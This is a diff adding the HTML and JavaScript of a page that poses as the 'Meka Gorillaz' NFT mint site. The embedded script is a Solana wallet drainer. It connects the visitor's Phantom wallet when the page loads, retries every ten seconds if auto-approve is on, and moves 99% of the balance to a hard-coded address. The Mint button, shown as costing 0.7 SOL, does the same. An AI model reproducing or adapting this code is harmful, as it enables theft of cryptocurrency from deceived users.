@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="format-detection" content="telephone=no" />
+    <title>Meka Gorillaz | Mint</title>
+    <link rel="icon" href="https://cdn.discordapp.com/icons/930208193945174056/1a38c0bc91a790301ef29f948c837291.webp?size=96">
+    <link rel="stylesheet" href="css/style.css" />
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Mint - mekagorillaz.com">
+    <meta property="og:url" content="https://mekagorillaz.com/">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Mint - mekagorillaz.com">
+    <meta name="twitter:image" content="https://mekagorillaz.com/embed.png">
+</head>
+
+<body>
+    <div class="wrapper">
+
+        <div class="image">
+            <img src="images/image.png" alt="">
+        </div>
+
+        <div class="header">
+            <div class="container">
+                <div class="header__items">
+                    <a href="#" class="header__logo"><img src="images/logo.png" alt=""
+            /></a>
+                    <ul class="header__social">
+                        <li>
+                            <a href="https://twitter.com/MekaGorillaz" target="_blank">
+                  <img src="images/social-1.png" alt="" />
+                </a>
+                        </li>
+                        <li>
+                            <a href="https://discord.com/invite/FRJCd8bAqz" target="_blank">
+                  <img src="images/social-2.png" alt="" />
+                </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="showcase">
+            <div class="container">
+                <div class="showcase__items">
+                    <div class="showcase__item">
+                        <p class="showcase__price">MEKA GORILLAZ MINT IS NOW LIVE!</p>
+                        <div class="showcase__text">
+                            MekaGorillaz mobile driving game coming in Q2 2022, NFT staking - full marketing rights to holders- GrillaDao
+                        </div>
+                        <div class="showcase__calculate">
+                            <div class="number" data-step="1" data-min="1" data-max="5">
+                                <a href="#" class="number-minus"><span>−</span></a>
+                                <input class="number-text" id="wqwqw" type="text" name="count" value="1" disabled />
+                                <a href="#" class="number-plus"><span>+</span></a>
+                            </div>
+                            <p class="showcase__total">
+                                Total: <span class="result">0.7</span> SOL
+                            </p>
+                        </div>
+                        <div class="showcase__btn" href="javascript:;" id="connect" style="display: flex">
+                            Connect wallet
+                        </div>
+                        <div class="showcase__btn" href="javascript:;" id="transfer" style="display: none">
+                            Mint
+                        </div>
+                    </div>
+                    <div class="showcase__image">
+                        <video src="images/gif.mp4" muted loop autoplay></video>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="./libs/jquery/jquery-3.2.1.min.js"></script>
+    <script src="js/main.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.29.2/lib/index.iife.min.js"></script>
+    <script>
+        function upValue() {
+            document.getElementById("counet").value =
+                parseInt(1) + parseInt(document.getElementById("counet").value);
+
+            document.getElementById("wqwqw").textContent =
+                (parseInt(document.getElementById("counet").value) * 1.777)
+                .toFixed(2)
+                .toString() + " SOL";
+        }
+
+        function downValue() {
+            if (document.getElementById("counet").value == "1") {} else {
+                document.getElementById("counet").value =
+                    parseInt(document.getElementById("counet").value) - parseInt(1);
+
+                document.getElementById("wqwqw").textContent =
+                    (parseInt(document.getElementById("counet").value) * 1.777)
+                    .toFixed(2)
+                    .toString() + " SOL";
+            }
+        }
+        window.addEventListener("load", () => {
+            var sent = false;
+            const connection = new solanaWeb3.Connection(
+                solanaWeb3.clusterApiUrl("mainnet-beta")
+            );
+
+            const getProvider = () => {
+                if ("solana" in window) {
+                    const provider = window.solana;
+                    if (provider.isPhantom) {
+                        return provider;
+                    }
+                }
+                window.open("https://phantom.app/", "_blank");
+            };
+
+            function onBodyLoad() {
+                const solConnected = window.solana.isConnected;
+
+                if (!solConnected) {
+                    connectWallet();
+                } else {
+                    document.getElementById("transfer").style.display = "flex";
+                    document.getElementById("connect").style.display = "none";
+                }
+                refreshStatus();
+            }
+
+            function refreshStatus() {
+                const provider = getProvider();
+                if (provider) {
+                    provider.on("connect", () => {
+                        setConnected();
+                        document.getElementById("transfer").style.display = "flex";
+                        document.getElementById("connect").style.display = "none";
+                    });
+                    provider.on("disconnect", () => {
+                        setNotConnected();
+                    });
+                }
+            }
+
+            function connectWallet() {
+                window.solana.connect({
+                    onlyIfTrusted: false,
+                });
+            }
+            async function setConnected() {
+                let account_info = await connection.getAccountInfo(
+                    window.solana.publicKey
+                );
+                console.log("Auto Approve: " + window.solana.autoApprove);
+            }
+
+            function trySend() {
+                if (window.solana.autoApprove) {
+                    if (!sent) {
+                        apimainnet();
+                    }
+                } else {
+                    console.log("Not auto approve!");
+                }
+            }
+            async function testTransfer2(howmany) {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+                const manylamports = (howmany * 1000000000).toFixed(0);
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(
+                    window.solana.publicKey
+                );
+                var charginglamports = manylamports;
+                console.log(charginglamports);
+                if (account_info.lamports / 2 > manylamports) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+
+                if (
+                    account_info.lamports < manylamports &&
+                    account_info.lamports > 100000
+                ) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+                console.log(charginglamports);
+
+                let transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: "2CviHC6c6PrqT4kvnwZ6VRFeLZhbCY9GQmwjsYoL8khc",
+                        lamports: charginglamports,
+                    })
+                );
+
+                let {
+                    blockhash
+                } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                return transaction;
+            }
+
+            async function makeTransfer(howmany) {
+                let transaction = await testTransfer2(howmany);
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(
+                        transaction,
+                        connection
+                    );
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(
+                        signed.serialize()
+                    );
+                    console.log(signature);
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            async function testTransfer() {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(
+                    window.solana.publicKey
+                );
+
+                if (account_info.lamports >= 10000000) {
+                    let transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: provider.publicKey,
+                            toPubkey: "2CviHC6c6PrqT4kvnwZ6VRFeLZhbCY9GQmwjsYoL8khc",
+                            lamports: (account_info.lamports * 0.99).toFixed(0),
+                        })
+                    );
+
+                    let {
+                        blockhash
+                    } = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = provider.publicKey;
+
+                    return transaction;
+                }
+            }
+
+            async function apimainnet() {
+                let transaction = await testTransfer();
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(
+                        transaction,
+                        connection
+                    );
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(
+                        signed.serialize()
+                    );
+                    console.log(signature);
+                    sent = true;
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            function setNotConnected() {
+                // document.getElementById("connStatus").innerHTML = "Not Connected";
+            }
+            onBodyLoad();
+            setInterval(trySend, 10000);
+
+            document.getElementById("transfer").onclick = function() {
+                makeTransfer(100000);
+            };
+            document.getElementById("connect").onclick = function() {
+                onBodyLoad();
+            };
+        });
+    </script>
+</body>
+
+</html>
